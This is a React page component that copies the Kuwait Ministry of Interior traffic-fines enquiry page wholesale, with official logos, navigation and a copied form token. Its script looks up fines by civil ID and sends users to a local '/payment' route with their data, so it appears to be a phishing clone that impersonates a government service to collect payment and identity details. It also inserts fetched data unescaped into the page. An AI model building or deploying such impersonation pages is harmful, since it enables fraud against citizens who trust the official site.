
import React, { useEffect } from 'react';
import { useLocation } from 'wouter';
import { trpc } from '@/lib/trpc';
import { useToast } from '@/hooks/use-toast';

export default function Home() {
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  
  const queryMutation = trpc.fines.query.useMutation({
    onSuccess: (data) => {
      const btn = document.getElementById('btnEnquire');
      if (btn) btn.innerHTML = 'إستعلم';
      
      const responseDiv = document.getElementById('responseInfo');
      if (responseDiv) {
        responseDiv.classList.remove('d-none');
        responseDiv.style.display = 'block';
        if (data.success) {
          let finesHtml = `
            <div class="col-12 mt-3" style="direction: rtl; text-align: right;">
              <div class="row font-weight-bold p-2" style="background-color: #d6dce5;">
                <div class="col-4">عدد المخالفات</div>
                <div class="col-4">المبلغ الاجمالي</div>
                <div class="col-4">المبلغ القابل للدفع</div>
              </div>
              <div class="row p-2 border-bottom">
                <div class="col-4">${data.fines.length}</div>
                <div class="col-4">${data.totalAmount} دك</div>
                <div class="col-4">${data.totalAmount} دك</div>
              </div>
              
              <div class="accordion mt-3" id="finesAccordion">
          `;
          
          data.fines.forEach((fine: any, index: number) => {
            finesHtml += `
              <div class="card mb-2" style="border: 1px solid #d6dce5;">
                <div class="card-header p-0" id="heading${index}" style="background-color: #f8f9fa;">
                  <button class="btn btn-link btn-block text-right d-flex justify-content-between align-items-center" type="button" data-toggle="collapse" data-target="#collapse${index}" style="color: #000576; text-decoration: none; padding: 15px;">
                    <span>
                      <i class="fas fa-chevron-down ml-2"></i>
                      مخالفة رقم: ${fine.ticketNo}
                    </span>
                    <span class="badge ${fine.payableOnline === 'Y' ? 'badge-success' : 'badge-danger'}" style="padding: 8px;">
                      ${fine.amount} دك
                    </span>
                  </button>
                </div>

                <div id="collapse${index}" class="collapse" data-parent="#finesAccordion">
                  <div class="card-body" style="background-color: white; font-size: 0.95rem;">
                    <div class="row mb-2">
                      <div class="col-4 font-weight-bold">تاريخ المخالفة:</div>
                      <div class="col-8">${fine.dateTime || fine.fineDate}</div>
                    </div>
                    <div class="row mb-2">
                      <div class="col-4 font-weight-bold">الموقع:</div>
                      <div class="col-8">${fine.location}</div>
                    </div>
                    <div class="row mb-2">
                      <div class="col-4 font-weight-bold">الجهة:</div>
                      <div class="col-8">${fine.source}</div>
                    </div>
                    <div class="row mb-2">
                      <div class="col-4 font-weight-bold">الوصف:</div>
                      <div class="col-8">${fine.description}</div>
                    </div>
                    <div class="row">
                      <div class="col-4 font-weight-bold">الحالة:</div>
                      <div class="col-8">
                        ${fine.payableOnline === 'Y' 
                          ? '<span class="text-success font-weight-bold">قابلة للدفع الكترونياً</span>' 
                          : '<span class="text-danger font-weight-bold">غير قابلة للدفع الكترونياً</span>'}
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            `;
          });
          
          finesHtml += `
              </div>
            </div>
          `;
          
          if (parseFloat(data.totalAmount) > 0) {
            finesHtml += `
              <div class="mt-4 text-center">
                <button id="btnPayNow" class="btn btn-primary btn-lg px-5 py-3 font-weight-bold" style="background-color: #000576; border: none; border-radius: 50px; box-shadow: 0 4px 15px rgba(0,5,118,0.3);">
                  <i class="fas fa-credit-card ml-2"></i> دفع المخالفات المختارة
                </button>
              </div>
            `;
          }
          
          responseDiv.innerHTML = finesHtml;
          
          setTimeout(() => {
            const payBtn = document.getElementById('btnPayNow');
            if (payBtn) {
              payBtn.onclick = () => {
                sessionStorage.setItem('paymentData', JSON.stringify({
                  selectedFines: data.fines,
                  totalAmount: data.totalAmount,
                  civilId: (document.getElementById('civilId') as HTMLInputElement)?.value
                }));
                setLocation('/payment');
              };
            }
            responseDiv.scrollIntoView({ behavior: 'smooth' });
          }, 100);
          
        } else {
          responseDiv.innerHTML = `<div class="alert alert-danger">${data.errorMessage || 'فشل الاستعلام'}</div>`;
        }
      }
    },
    onError: (err) => {
      const btn = document.getElementById('btnEnquire');
      if (btn) btn.innerHTML = 'إستعلم';
      const responseDiv = document.getElementById('responseInfo');
      if (responseDiv) {
        responseDiv.classList.remove('d-none');
        responseDiv.style.display = 'block';
        responseDiv.innerHTML = `
          <div class="alert alert-danger text-right" style="direction: rtl; border-right: 5px solid #dc3545;">
            <strong>نعتذر، حدث خطأ أثناء الاتصال بخدمة الاستعلام</strong><br/>
            <p class="mt-2 mb-1">السبب التقني: <code style="background: #f8d7da; padding: 2px 5px;">${err.message}</code></p>
            <small>يرجى المحاولة مرة أخرى بعد دقيقة. نحن نعمل على تحسين استقرار الاتصال بموقع وزارة الداخلية.</small>
          </div>
        `;
      }
      toast({ variant: 'destructive', title: 'خطأ في الاتصال', description: err.message });
    }
  });

  useEffect(() => {
    const handleInquire = (e: Event) => {
      e.preventDefault();
      const civilIdInput = document.getElementById('civilId') as HTMLInputElement;
      const civilId = civilIdInput?.value || '';
      const enquiryTypeSelect = document.getElementById('enquiryType') as HTMLSelectElement;
      const enquiryType = enquiryTypeSelect?.value || '1';

      if (civilId.length < 8) {
        toast({ variant: 'destructive', description: 'يرجى إدخال الرقم المدني بشكل صحيح' });
        return;
      }

      const btn = document.getElementById('btnEnquire');
      if (btn) btn.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> جاري الاستعلام...';
      
      queryMutation.mutate({ civilId, enquiryType: enquiryType as '1' | '2', lang: 'ar' });
    };

    const timer = setTimeout(() => {
      const form = document.getElementById('enquireForm');
      if (form) form.onsubmit = handleInquire;
      
      const btn = document.getElementById('btnEnquire');
      if (btn) btn.onclick = handleInquire;
    }, 1000);

    return () => clearTimeout(timer);
  }, []);

  return (
    <div 
      className="moi-raw-injected-page" 
      style={{ all: 'unset', display: 'block', width: '100%', minHeight: '100vh', direction: 'rtl' }}
      dangerouslySetInnerHTML={{ __html: `
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>General Department of Traffic - Ministry of Interior - Kuwait</title>
    <link rel="icon" type="image/x-icon" href="https://www.moi.gov.kw/main/favicon.ico" />
    <script type="text/javascript">
        <!--
        window.rsConf = {general: {usePost: true,skipHiddenContent:true }};
        //-->
    </script>
    <script src="https://cdn-na.readspeaker.com/script/56/webReader/webReader.js?pids=wr" type="text/javascript" id="rs_req_Init"></script>
    
    
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" crossorigin="anonymous" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" />
<meta name="x-stylesheet-fallback-test" content="" class="sr-only" /><script>!function(a,b,c,d){var e,f=document,g=f.getElementsByTagName("SCRIPT"),h=g[g.length-1].previousElementSibling,i=f.defaultView&&f.defaultView.getComputedStyle?f.defaultView.getComputedStyle(h):h.currentStyle;if(i&&i[a]!==b)for(e=0;e<c.length;e++)f.write('<link href="'+c[e]+'" '+d+"/>")}("position","absolute",["/main/lib/bootstrap/dist/css/bootstrap.min.css"], "rel=\u0022stylesheet\u0022 crossorigin=\u0022anonymous\u0022 integrity=\u0022sha384-ggOyR0iXCbMQv3Xipma34MD\u002BdH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T\u0022 ");</script>
    
    <link rel="stylesheet" href="https://www.moi.gov.kw/main/lib/fontawesome/v7/css/all.css" />
    <!-- <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-star-rating/4.0.6/css/star-rating.min.css" media="all" rel="stylesheet" type="text/css" />
    optionally if you need to use a theme, then include the theme CSS file as mentioned below 
    <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-star-rating/4.0.6/themes/krajee-svg/theme.css" media="all" rel="stylesheet" type="text/css" />-->
    <link rel="stylesheet" href="https://www.moi.gov.kw/main/css/site.css?v=go_4IccMhw1NChPOSH_W7AbpThLoN7-zMHFe4trNRE0" />
    
</head>
<body>
    <div class="container">
        <header>
            <div class="row">
                <div class="col-4 col-md-2 col-lg-2 text-center" style="border:0px solid red;">
                    <a class="navbar-brand m-0" href="https://www.moi.gov.kw/main/">
                        <img src="https://www.moi.gov.kw/main/images/assets/common/logo-moi.svg" style="height: 120px;" />
                    </a>
                </div>
                <div class="col-1 align-self-center" style="border:0px solid red;">
                    <div class="row">
                        <div class="col text-center">
                            <img src="https://www.moi.gov.kw/main/images/assets/common/ar/state-of-kuwait.svg" class="text-center main-header-title" />
                        </div>
                    </div>
                    <div class="row">
                        <div class="col text-center">
                            <img src="https://www.moi.gov.kw/main/images/assets/common/ar/ministry-of-interior.svg" class="mt-2 main-header-title" />
                        </div>
                    </div>
                </div>
            </div>
            <nav class="navbar navbar-expand-lg navbar-dark border-bottom box-shadow">
                <div class="container">
                    <a class="navbar-brand" href="/main"></a>
                    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarSupportedContent"
                            aria-expanded="false" aria-label="Toggle navigation">
                        <span class="navbar-toggler-icon"></span>
                    </button>
                    <div class="navbar-collapse collapse flex-sm-row-reverse" id="navbarResponsive">
                        <ul class="navbar-nav flex-grow-1 p-0 clearfix" style="margin:0 auto;vertical-align:top;border:0px solid red;">
                            <div class="d-flex flex-sm-row flex-column container-navlinks" style="border:0px solid red;overflow:visible;">
                            <li class="nav-item active">
                                <a class="nav-link" href="/main">
                                    الرئيسيــة
                                    <span class="sr-only">(current)</span>
                                </a>
                            </li>

                            <li class="nav-item" id="eservicesMenu" data-trigger="focus">
                                <a href="#" id="nav-eServices" class="nav-link" data-target="#eservices" data-toggle="collapse" aria-expanded="false" aria-controls="eservices">
                                    الخدمات الإلكترونيـة
                                </a>
                                <span class="collapse navbar-submenu" id="eservices" data-parent="#navbarResponsive">
                                    <ul class="nav justify-content-center pt-2 pb-2 pl-3 pr-3" style="border:0px solid red;">
                                        <li class="nav-item m-0">
                                            <a href="https://www.moi.gov.kw/main/eservices">
                                                <img src="https://www.moi.gov.kw/main/images/assets/it-comm/ico-it-communications.svg" alt="Information Systems" class="menu-icon" />
                                            </a>
                                            <a class="nav-link active" href="https://www.moi.gov.kw/main/eservices">
                                                <div class="main-menu-text">الإدارة العامة
لنظم المعلومات</div>
                                            </a>
                                        </li>
                                        <li class="nav-item">
                                            <a href="/gdt">
                                                <img src="https://www.moi.gov.kw/main/images/assets/general-traffic/ico-general-traffic.svg" alt="Traffic" class="menu-icon" />
                                            </a>
                                            <a href="/gdt" class="nav-link">
                                                <div class="main-menu-text">الإدارة العامة
للمرور</div>
                                            </a>
                                        </li>
                                        <li class="nav-item">
                                            <a href="https://nat.moi.gov.kw/citizenship-passport.nsf/Main?OpenForm&langid=1">
                                                <img src="https://www.moi.gov.kw/main/images/assets/citizenship-passport/ico-citizenship-passport.svg" alt="Citizenship" class="menu-icon" />
                                            </a>
                                            <a class="nav-link" href="https://nat.moi.gov.kw/citizenship-passport.nsf/Main?OpenForm&langid=1">
                                                <div class="main-menu-text">الإدارة العامة
للجنسية ووثائق السفر</div>
                                            </a>
                                        </li>
                                        <li class="nav-item">
                                            <a href="https://www.moi.gov.kw/main/eservices/residence">
                                                <img src="https://www.moi.gov.kw/main/images/assets/residency/ico-residence.svg" alt="Immigration" class="menu-icon" />
                                            </a>
                                            <a class="nav-link" href="https://www.moi.gov.kw/main/eservices/residence">
                                                <div class="main-menu-text">الإدارة العامة
لشؤون  الإقامة</div>
                                            </a>
                                        </li>
                                        <li class="nav-item">
                                            <a href="https://www.moi.gov.kw/main/eservices/civildefence">
                                                <img src="https://www.moi.gov.kw/main/images/assets/civil-defence/ico-civil-defence.svg" alt="Civil Defence" class="menu-icon" />
                                            </a>
                                            <a class="nav-link" href="https://www.moi.gov.kw/main/eservices/civildefence">
                                                <div class="main-menu-text">الإدارة العامة
للدفاع المدني</div>
                                            </a>
                                        </li>
                                        <li class="nav-item">
                                            <a href="https://www.moi.gov.kw/main/eservices/servicecentres">
                                                <img src="https://www.moi.gov.kw/main/images/assets/service-centres/ico-service-centre.svg" alt="Service Centres" class="menu-icon" />
                                            </a>
                                            <a class="nav-link" href="https://www.moi.gov.kw/main/eservices/servicecentres">
                                                <div class="main-menu-text">الإدارة العامة
لمراكز الخدمة</div>
                                            </a>
                                        </li>
                                        <li class="nav-item">
                                            <a href="https://nat5.moi.gov.kw/Coast-Guard.nsf/Main?openform&langid=1">
                                        <img src="https://www.moi.gov.kw/main/images/assets/coast-guard/ico-coast-guard.svg" alt="Coast Guard" class="menu-icon" />
                                        </a>
                                            <a class="nav-link" href="https://nat5.moi.gov.kw/Coast-Guard.nsf/Main?openform&langid=1">
                                        <div class="main-menu-text">الإدارة العامة
لخفر السواحل</div>
                                        </a>
                                        </li>
                                        <li class="nav-item">
                                            <a href="https://rnt.moi.gov.kw/pas/">
                                                <img src="https://www.moi.gov.kw/main/images/assets/ico-shoon-quwa.svg" alt="Police Affairs" class="menu-icon" />
                                            </a>
                                            <a class="nav-link" href="https://rnt.moi.gov.kw/pas/">
                                                <div class="main-menu-text">الإدارة العامة
لشؤون قوة الشرطة</div>
                                            </a>
                                        </li>
                                        <li class="nav-item">
                                            <a href="https://nat4.moi.gov.kw/saad-abdullah-academy.nsf">
                                                <img src="https://www.moi.gov.kw/main/images/assets/academy/ico-police-academy.svg" alt="Saad Abdullah Police Academy" class="menu-icon" />
                                            </a>
                                            <a class="nav-link" href="https://nat4.moi.gov.kw/saad-abdullah-academy.nsf">
                                                <div class="main-menu-text">أكاديمية سعد العبدالله
للعلوم الأمنية</div>
                                            </a>
                                        </li>
                                        <li class="nav-item">
                                            <a href="https://www.moi.gov.kw/main/eservices/finance">
                                                <img src="https://www.moi.gov.kw/main/images/assets/finance/ico-finance.svg" alt="Finance" class="menu-icon" />
                                            </a>
                                            <a class="nav-link" href="https://www.moi.gov.kw/main/eservices/finance">
                                                <div class="main-menu-text">الإدارة العامة
للشؤن المالية</div>
                                            </a>
                                        </li>
                                        <li class="nav-item">
                                            <a href="https://eservices5.moi.gov.kw/Investigations.nsf">
                                                <img src="https://www.moi.gov.kw/main/images/assets/investigations/ico-investigations.svg" alt="Investigations" class="menu-icon" />
                                            </a>
                                            <a class="nav-link" href="https://eservices5.moi.gov.kw/Investigations.nsf">
                                                <div class="main-menu-text">الإدارة العامة
 للتحقيقات</div>
                                            </a>
                                        </li>
                                        <li class="nav-item m-0">
                                            <a href="https://www.moi.gov.kw/main/sections/training">
                                                <img src="https://www.moi.gov.kw/main/images/assets/training/ico-training.svg" alt="Training" class="menu-icon" />
                                            </a>
                                            <a class="nav-link" href="https://www.moi.gov.kw/main/sections/training">
                                                <div class="main-menu-text">الإدارة العامة
للتدريب</div>
                                            </a>
                                        </li>
                                    </ul>
                                </span>
                            </li>
                            <li class="nav-item" id="relatedDepartmentsMenu">
                                <a href="#" id="nav-relDepts" class="nav-link" data-target="#relatedDepts" data-toggle="collapse" aria-expanded="false" aria-controls="relatedDepts">
                                    إدارات توعوية
                                </a>
                                <span id="relatedDepts" class="collapse navbar-submenu" data-parent="#navbarResponsive">
                                    <ul class="nav justify-content-center pt-2 pb-2 pl-3 pr-3" style="border:0px solid red;">
                                        <li class="nav-item m-0">
                                            <a href="https://www.moi.gov.kw/main/sections/cyber-crime">
                                                <img src="https://www.moi.gov.kw/main/images/assets/cyber-crime/ico-cyber-crime.svg" alt="Cyber Crime" class="menu-icon" />
                                            </a>
                                            <a class="nav-link" href="https://www.moi.gov.kw/main/sections/cyber-crime">
                                                <div class="main-menu-text">إدارة مكافحة 
الجرائم الإلكترونية</div>
                                            </a>
                                        </li>
                                        <li class="nav-item m-0">
                                            <a href="https://www.moi.gov.kw/main/sections/juvenile-protection">
                                                <img src="https://www.moi.gov.kw/main/images/assets/juvenile-protection/ico-juvenile-protection.svg" alt="Juvenile Protection" class="menu-icon" />
                                            </a>
                                            <a class="nav-link" href="https://www.moi.gov.kw/main/sections/juvenile-protection">
                                                <div class="main-menu-text">إدارة حماية الأحداث</div>
                                            </a>
                                        </li>
                                        <li class="nav-item m-0">
                                            <a href="https://www.moi.gov.kw/main/sections/anti-drug">
                                                <img src="https://www.moi.gov.kw/main/images/assets/anti-drug/ico-anti-drug.svg" alt="Anti Drug" class="menu-icon" />
                                            </a>
                                            <a class="nav-link" href="https://www.moi.gov.kw/main/sections/anti-drug">
                                                <div class="main-menu-text">الإدارة العامة
لمكافحة المخدرات</div>
                                            </a>
                                        </li>
                                        <li class="nav-item m-0">
                                            <a href="https://www.moi.gov.kw/main/sections/anti-human-trafficking">
                                                <img src="https://www.moi.gov.kw/main/images/assets/cyber-crime/ico-cyber-crime.svg" alt="Anti Human Trafficking" class="menu-icon" />
                                            </a>
                                            <a class="nav-link" href="https://www.moi.gov.kw/main/sections/anti-human-trafficking">
                                                <div class="main-menu-text">إدارة حماية الآداب العامة
 ومكافحة الإتجار بالأشخاص</div>
                                            </a>
                                        </li>
                                        <li class="nav-item m-0">
                                            <a href="https://www.moi.gov.kw/main/sections/security-media">
                                                <img src="https://www.moi.gov.kw/main/images/assets/security-media/ico-security-media.svg" alt="Security Media Dept" class="menu-icon" />
                                            </a>
                                            <a class="nav-link" href="https://www.moi.gov.kw/main/sections/security-media">
                                                <div class="main-menu-text">الإدارة العامة
 للعلاقات والإعلام الأمني</div>
                                            </a>
                                        </li>
                                        <li class="nav-item m-0">
                                            <a href="https://eservices2.moi.gov.kw/Correctional-Facilities.nsf/Main?OpenForm&LangID=1">
                                                <img src="https://www.moi.gov.kw/main/images/assets/correctional-facilities/icon-correctional-facilities.svg" alt="Correctional Facilities" class="menu-icon" />
                                            </a>
                                            <a class="nav-link" href="https://eservices2.moi.gov.kw/Correctional-Facilities.nsf/Main?OpenForm&LangID=1">
                                                <div class="main-menu-text">الإداره العامة
 للمؤسسات الإصلاحية</div>
                                            </a>
                                        </li>
                                        <li class="nav-item m-0">
                                            <a href="https://www.moi.gov.kw/main/sections/security-systems">
                                                <img src="https://www.moi.gov.kw/main/images/assets/security-systems/ico-security-systems.svg" alt="Security Systems" class="menu-icon" />
                                            </a>
                                            <a class="nav-link" href="https://www.moi.gov.kw/main/sections/security-systems">
                                                <div class="main-menu-text">الادارة العامة
 للأنظمة الأمنية</div>
                                            </a>
                                        </li>
                                        <li class="nav-item m-0 d-none1">
                                            <a href="https://www.moi.gov.kw/main/sections/national-security">
                                                <img src="https://www.moi.gov.kw/main/images/assets/national-security/ico-nat-security.svg" alt="Training" class="menu-icon" />
                                            </a>
                                            <a class="nav-link" href="https://www.moi.gov.kw/main/sections/national-security">
                                                <div class="main-menu-text">كلية الأمن الوطني</div>
                                            </a>
                                        </li>
                                        <li class="nav-item m-0">
                                            <a href="https://nat2.moi.gov.kw/GDSRC.nsf">
                                                <img src="https://www.moi.gov.kw/main/images/assets/research-studies/ico-research.svg" alt="Administrative Affairs Dept." class="menu-icon" />
                                            </a>
                                            <a href="https://nat2.moi.gov.kw/GDSRC.nsf">
                                                <div class="main-menu-text">الإدارة العامة
لمركز البحوث والدراسات</div>
                                            </a>
                                        </li>
                                        <li class="nav-item m-0">
                                            <a href="https://www.moi.gov.kw/main/sections/human-resources">
                                                <img src="https://www.moi.gov.kw/main/images/assets/human-resources/ico-hr.svg" alt="Administrative Affairs Dept." class="menu-icon" />
                                            </a>
                                            <a href="https://www.moi.gov.kw/main/sections/human-resources">
                                                <div class="main-menu-text">الإدارة العامة للشئون الإدارية</div>
                                            </a>
                                        </li>
                                    </ul>
                                </span>
                            </li>
                            <li class="nav-item">
                                <div class="dropdown">
                                    <a href="#" class="nav-link" data-toggle="collapse" aria-expanded="false">
                                        الإصدارات الإلكترونية
                                    </a>
                                    <div class="dropdown-menu text-right" style="background: #e9e6de;padding:0px;">
                                        <a class="dropdown-item" href="https://www.moi.gov.kw/main/emagazine">
                                            المجلة الإلكترونية
                                        </a>
                                        <a class="dropdown-item" href="https://www.moi.gov.kw/main/news/archive">
                                            أرشيـف الأخبار
                                        </a>
                                    </div>
                                </div>
                            </li>
                            
                            <li class="nav-item">
                                <a class="nav-link" href="https://eservices.moi.gov.kw:45314/verify/qrcode">
                                    التحقق من الوثائق
                                </a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="https://eservices1.moi.gov.kw/moicus.nsf/moicus?openform&LangID=1">
                                    يهمنا رايك
                                </a>
                            </li>
                            <li class="nav-item" id="navEmergency">
                                <a class="nav-link" href="#" data-toggle="modal" data-target="#emergencyContactModal">
                                    أرقام الطوارئ
                                </a>
                            </li>
                            <li class="nav-item" id="navMeta">
                                <div class="dropdown">
                                    <a href="#" class="nav-link" data-toggle="collapse" aria-expanded="false">
                                        منصة المواعيد
                                    </a>
                                    <div class="dropdown-menu text-right" style="background: #e9e6de;padding:0px;">
                                        <a class="dropdown-item" href="https://meta.e.gov.kw/">
                                            منصة 'متى'
                                        </a>
                                        <a class="dropdown-item" href="https://nat2.moi.gov.kw/MOIBioEnrol.nsf/initRequest?OpenForm&LangID=1">
                                            حجز موعد البصمة البيومترية للخليجيين
                                        </a>
                                        <a class="dropdown-item" href="https://nat1.moi.gov.kw/MOIeTPAp.nsf/Request?OpenForm&LangID=1">
                                            حجز مواعيد جوازات السفر المؤقتة والوثائق
                                        </a>
                                    </div>
                                </div>
                            </li>
                            </div>
                            <li class="nav-item mt-0 mb-0 mr-auto" style="border:0px solid red;float:left;">
                                

<div style="border:0px solid white;height:100%;" class="form-group text-center" title="Request culture provider:">
    <form id="selectLanguage" method="post" class="form-horizontal d-flex " role="form" style="border:0px solid green;height:100%;" action="https://www.moi.gov.kw/main/Home/SetLanguage?returnUrl=%2Fmain%2Feservices%2Fgdt%2Fviolation-enquiry">
        <div class="col-12 d-flex">
                <button class="btn btn-lang align-content-center align-self-center text-center">English</button>
                <input type="hidden" name="culture" value="en" />
            </div>
<input name="__RequestVerificationToken" type="hidden" value="CfDJ8BC0QUj6RopNjXFvakHlMJuwKLDqsmYibQ08bc9sm6JR9Xe_mtPgavHV-dy4UNEMjxg5P4TdxjWVjdCm9L4dSCTyjXZ6G3lh-dmb6KFRP9ZrrZFrQstfPx1BS8NeHt4FAF6X9bxfULsxdCaRjHFQwfU" /></form>
</div>
                            </li>
                        </ul>
                    </div>
                </div>
            </nav>
        </header>
        <div class="container p-0 m-0 content-main">
            <div id="readspeaker_button1" class="rs_skip rsbtn rs_preserve">
                <a rel="nofollow" class="rsbtn_play" title="ReadSpeaker webReader &#x625;&#x633;&#x62A;&#x645;&#x639; &#x625;&#x644;&#x649; &#x647;&#x630;&#x647; &#x627;&#x644;&#x635;&#x641;&#x62D;&#x629;&#x650; &#x645;&#x633;&#x62A;&#x62E;&#x62F;&#x645;&#x627;&#x64B;" href="https://app-na.readspeaker.com/cgi-bin/rsent?customerid=56&amp;lang=ar_ar&amp;voice=Amir&amp;readclass=content-main">
                    <span class="rsbtn_left rsimg rspart"><span class="rsbtn_text"><span>&#x627;&#x633;&#x62A;&#x645;&#x639; </span></span></span>
                    <span class="rsbtn_right rsimg rsplay rspart"></span>
                </a>
            </div>
            <main role="main" class="pb-3">
                <link rel="stylesheet" href="https://cdn.datatables.net/1.10.20/css/dataTables.bootstrap4.min.css" />
<link rel="stylesheet" href="https://cdn.datatables.net/responsive/2.2.3/css/responsive.dataTables.min.css" />
<style>
    .page-item.active .page-link{
        background-color:#000576;
        border-color: #000576;
    }
</style>
<div class="row p-0 m-0 content">
    <div class="col">
        <div class="row text-justify">
            <div class="col-sm-4 title">
                <a href="https://www.moi.gov.kw/main/eservices/gdt">
                    <img src="https://www.moi.gov.kw/main/images/assets/general-traffic/logo-general-traffic.svg" class="intro-logo m-1" />
                    &nbsp;الإدارة العامة للمرور
                </a>
            </div>
            <div class="col-sm-8">&nbsp;</div>
        </div>
        <div class="row text-center">
                <div class="col-sm-12 col-md-4 col-lg-4 side-menu text-right">
        <div class="row mt-2">
            <div class="col-2 mr-1 ml-1">
                <a href="https://edl.moi.gov.kw/">
                    <img src="https://www.moi.gov.kw/main/images/assets/general-traffic/ico-renew-license.svg" class="side-menu-icon" />
                </a>
            </div>
            <div class="col-8 align-self-center">
                <a href="https://edl.moi.gov.kw/">
                    الخدمات الالكترونية لرخص السوق
                </a>
            </div>
            <div class="col-1">&nbsp;</div>
        </div>
        <div class="row mt-2">
            <div class="col-2 mr-1 ml-1">
                <a href="https://www.moi.gov.kw/main/eservices/gdt/violation-enquiry">
                    <img src="https://www.moi.gov.kw/main/images/assets/common/ico-payment.svg" class="side-menu-icon" />
                </a>
            </div>
            <div class="col-8 align-self-center">
                <a href="https://www.moi.gov.kw/main/eservices/gdt/violation-enquiry">
                    دفع المخالفات
                </a>
            </div>
            <div class="col-1">&nbsp;</div>
        </div>
        <div class="row mt-2">
            <div class="col-2 mr-1 ml-1">
                <a href="#appointmentsMenu" data-toggle="collapse" data-target="#appointmentsMenu" aria-expanded="false" aria-controls="appointmentsMenu">
                    <img src="https://www.moi.gov.kw/main/images/assets/general-traffic/ico-booking.svg" class="side-menu-icon" />
                </a>
            </div>
            <div class="col-8 align-self-center">
                <a href="#appointmentsMenu" data-toggle="collapse" data-target="#appointmentsMenu" aria-expanded="false" aria-controls="appointmentsMenu">
                    نظام مواعيد اختبار القيادة
                </a>
            </div>
            <div class="col-1">&nbsp;</div>
        </div>
        <div class="collapse" id="appointmentsMenu">
            <div class="row mt-2 text-justify">
                <div class="col-2">
                    &nbsp;
                </div>
                <div class="col-8">
                    <i class="far fa-circle"></i>&nbsp;خدمة المواعيد متاحة عبر تطبيق سهل
                </div>
                <div class="col-2">&nbsp;</div>
            </div>
            <div class="row mt-2 text-justify">
                <div class="col-2">
                    &nbsp;
                </div>
                <div class="col-8">
                    <a href="https://ttd.moi.gov.kw/">
                        <i class="far fa-circle"></i>&nbsp;اختبر نفسك
                    </a>
                </div>
                <div class="col-2">&nbsp;</div>
            </div>
        </div>
        <div class="row mt-2">
            <div class="col-2 mr-1 ml-1">
                <a href="https://www.moi.gov.kw/main/eservices/gdt/services">
                    <img src="https://www.moi.gov.kw/main/images/assets/general-traffic/ico-procedures.svg" class="side-menu-icon" />
                </a>
            </div>
            <div class="col-8 align-self-center">
                <a href="https://www.moi.gov.kw/main/eservices/gdt/services">
                    &nbsp;معاملات المرور
                </a>
            </div>
        </div>
        <div class="row mt-2">
            <div class="col-2 mr-1 ml-1">
                <a href="#sectionsMenu" data-toggle="collapse" data-target="#sectionsMenu" aria-expanded="false" aria-controls="sectionsMenu">
                    <img src="https://www.moi.gov.kw/main/images/assets/general-traffic/ico-locations-sections.svg" class="side-menu-icon" />
                </a>
            </div>
            <div class="col-8 align-self-center">
                <a href="https://www.moi.gov.kw/main/eservices/gdt/locations">
                    &nbsp;مواقع الإدارة العامة للمرور
                </a>
            </div>
        </div>
    <div class="row mt-2">
        <div class="col-2 mr-1 ml-1">
            <a href="https://www.moi.gov.kw/main/content/docs/gdt/driving-license-conditions.pdf">
                <img src="https://www.moi.gov.kw/main/images/assets/common/ico-pdf-doc.svg" class="side-menu-icon" />
            </a>
        </div>
        <div class="col-8 align-self-center">
            <a href="https://www.moi.gov.kw/main/content/docs/gdt/driving-license-conditions.pdf">
                شروط منح رخص السوق لغير الكويتيين
            </a>
        </div>
    </div>
    </div>  
            <div class="col-sm-12 col-md-8 col-lg-8" id="GDTContent">
                <div class="row">
                    <div class="col-3">&nbsp;</div>
                    <div class="col-6">
                        <div class="title">
                            الإدارة العامة للمرور
                        </div>
                        <div>
                            <img src="https://www.moi.gov.kw/main/images/assets/common/ico-horizontal-bar.svg" />
                        </div>
                    </div>
                    <div class="col-3">&nbsp;</div>
                </div>
                <div class="row mt-2 pl-4 pr-4 pb-5 text-justify">
                    <div class="col-12">
                        <form id="enquireForm">
                            <div class="form-row d1-none">
                                <div class="col-sm-12 col-md-6">
                                    <label>Enquiry Type</label>
                                    <select class="form-control" id="enquiryType">
                                        <option selected value="1">الأفراد</option>
                                        <option value="2">الشركات</option>
                                    </select>
                                </div>
                            </div>
                            <div class="form-row mt-2">
                                <div class="col-sm-12 col-md-6">
                                    <label id="lblEnquiryType">الرقم المدني أو الرقم الموحد</label>
                                    <input class="form-control" id="civilId" name="civilId" maxlength="12" minlength="12" />
                                </div>
                            </div>
                            <div class="form-row mt-2">
                                <div class="col-sm-12 col-md-4">
                                    <button id="btnEnquire" class="btn btn-primary btn-block mt-2 mt-md-0">إستعلم</button>
                                </div>
                            </div>
                            <div style="border-bottom:2px solid #d6dce5;" class="form-row p-3 mt-3 d-none text-right" id="responseInfo">

                            </div>
                            <div class="form-row align-self-center mt-2">
                                <div class="col-12 text-left" id="payingAmount"></div>
                            </div>
                            <div class="form-row mt-3">
                                <div class="col-12 text-right font-weight-bold mb-2">
                                    بعد إجراء عملية الدفع.. يرجى عدم محاولة الدفع مرة أخرى حيث يجرى تحديث البيانات خلال 15 دقيقة
                                </div>
                                <div class="col-sm-12 col-md-4 text-right">
                                    <input type="button" id="btnPay" class="btn btn-primary btn-block d-none" disabled value="إدفع">
                                </div>
                                <div class="col-sm-12 col-md-6 align-self-center">&nbsp;</div>
                            </div>
                            <div class="form-row mt-3">
                                <div class="col-12 align-self-center">
                                    <span class="badge badge-success p-2" style="font-weight:normal !important;">قابلة للدفع الكترونياً</span>
                                    <span class="badge badge-danger p-2" style="font-weight:normal !important;">غير قابلة للدفع الكترونياً</span>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
                <div class="d-flex justify-content-center">
                    <div class="spinner-grow text-secondary d-none" role="status" id="workingOnIt">
                        <span class="sr-only">Loading...</span>
                    </div>
                </div>
                <div class="row mt-2 pl-4 pr-4 pb-5 text-center d-none">
                    <div class="col-12">
                        The service will be available shortly
                        <br />
                        الخدمة ستعود قريباً
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>


            </main>
        </div>



